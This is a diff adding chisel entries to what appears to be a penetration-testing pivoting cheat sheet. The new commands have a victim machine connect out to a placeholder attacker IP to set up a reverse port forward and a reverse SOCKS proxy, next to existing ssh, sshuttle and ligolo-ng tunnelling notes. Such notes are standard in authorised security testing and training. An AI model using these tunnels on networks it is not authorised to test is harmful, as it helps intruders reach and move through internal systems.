@@ -18,6 +18,20 @@ ssh -N -R <tcp_port> <kali_machine_ssh_user>@<kali_machine_ip>
 ### SSHuttle
 sshuttle -r <accessible_machine_ssh_user>@<accessible_machine_ip>:<tcp_port> <10.4.50.0/24> <172.16.50.0/24>
 
+### Chisel Port Forwading
+#### Attacker side
+chisel server --port 8080 --reverse
+#### Victim side
+./chisel client <attacker-ip>:8080 R:<attacker-listener-port>:127.0.0.1:<victim-target-port>
+
+### Chisel Reverse Dynamic Socks Proxy
+#### Attacker side
+chisel server --port 8080 --reverse
+sudo vim /etc/proxychains.conf
+-> socks5  127.0.0.1  1080
+#### Victim side
+./chisel client <attacker-ip>:8080 R:socks
+
 ### ligolo-ng
 #### STEP-1 (Attacker side)
 sudo ip tuntap add user [your_username] mode tun ligolo
